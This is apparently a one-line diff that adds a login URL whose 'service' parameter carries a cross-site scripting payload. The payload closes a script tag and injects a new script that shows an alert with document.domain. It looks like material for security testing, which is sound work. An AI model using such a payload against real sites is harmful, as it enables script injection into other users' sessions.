@@ -1,0 +1,1 @@
+/login/?redirectTo=/tenant/e&service=</script><script>alert(document.domain)</script>
